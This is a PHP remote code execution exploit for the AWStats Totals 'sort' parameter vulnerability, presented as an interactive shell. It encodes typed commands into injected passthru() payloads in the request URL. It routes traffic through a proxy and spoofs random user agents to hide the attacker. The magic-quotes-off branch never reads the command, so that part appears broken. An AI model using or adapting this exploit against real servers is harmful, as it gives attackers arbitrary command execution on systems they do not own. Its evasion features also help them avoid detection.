AWStats Totals (awstatstotals.php sort) Remote Code Execution Exploit
=====================================================================



<?php
/* 
 * Remote Execution Exploit for AWStats Totals vulnerability (Interactive Shell) Version 2
 * 
 * Updated 05/09/08: The exploit now works with magic quotes on or off
 *  
 * Author: Ricardo Almeida
 *
 * Greetz
 * The hacker webzine authored by Ronald van den Heetkamp for his code
 *
 * Credits: Vulnerabilities reported by Emory University.
 *          http://userwww.service.emory.edu/~ekenda2/EMORY-2008-01.txt 
 * 
 */ 

function wrap($url){
  $ua = array(&#039;Mozilla&#039;,&#039;Opera&#039;,&#039;Microsoft Internet Explorer&#039;,&#039;ia_archiver&#039;);
  $op = array(&#039;Windows&#039;,&#039;Windows XP&#039;,&#039;Linux&#039;,&#039;Windows NT&#039;,&#039;Windows 2000&#039;,&#039;OSX&#039;);
  $agent  = $ua[rand(0,3)].&#039;/&#039;.rand(1,8).&#039;.&#039;.rand(0,9).&#039; (&#039;.$op[rand(0,5)].&#039; &#039;.rand(1,7).&#039;.&#039;.rand(0,9).&#039;; en-US;)&#039;;
  # tor or other proxy
  $tor = &#039;172.20.1.15:8080&#039;;
  $timeout = &#039;300&#039;;
  $ack = curl_init(); 
  curl_setopt ($ack, CURLOPT_PROXY, $tor); 
  curl_setopt ($ack, CURLOPT_URL, $url);
  curl_setopt ($ack, CURLOPT_HEADER, 1);  
  curl_setopt ($ack, CURLOPT_USERAGENT, $agent); 
  curl_setopt ($ack, CURLOPT_RETURNTRANSFER, 1); 
  curl_setopt ($ack, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt ($ack, CURLOPT_TIMEOUT, $timeout);
  $syn = curl_exec($ack);
  $info = curl_getinfo($ack);
  curl_close($ack);   

  if($info[&#039;http_code&#039;] == &#039;200&#039;) {
    return $syn;
    die();
  } else {
    return "Fail! :".$info[&#039;http_code&#039;]."\r\n";
  }
}

if ($argc != 3) {die("Usage: awtotalhack.php <host> <magic_quotes on or off>\nEx: awtotalhack.php host.tld on\n");}
array_shift($argv);
$host = $argv[0];
$magic = $argv[1];

# Start the interactive shell
while(1){
  fwrite(STDOUT, "[shell:~ # ");
  if ($magic == "on") {
    $c = str_split(trim(fgets(STDIN)));
    if (implode($c) == "exit") {die();};
    for($i=0;$i<count($c);$i++) {$c[$i] = "chr(".ord($c[$i]).")";}
    $cmd = implode("%2e", $c);
    $attackurl = "http://".$host."/"."awstatstotals.php?sort=%7b%24%7bpassthru%28".$cmd."%29%7d%7d%7b%24%7bexit%28%29%7d%7d";
    echo wrap($attackurl);
  } else if ($magic == "off") {
    if ($cmd == "exit") {die();};
    $attackurl = "http://".$host."/"."awstatstotals.php?sort=%22%5d%2epassthru%28%27".$cmd."%27%29%2eexit%28%29%2e%24a%5b%22";
    echo wrap($attackurl);
  }
}
?>




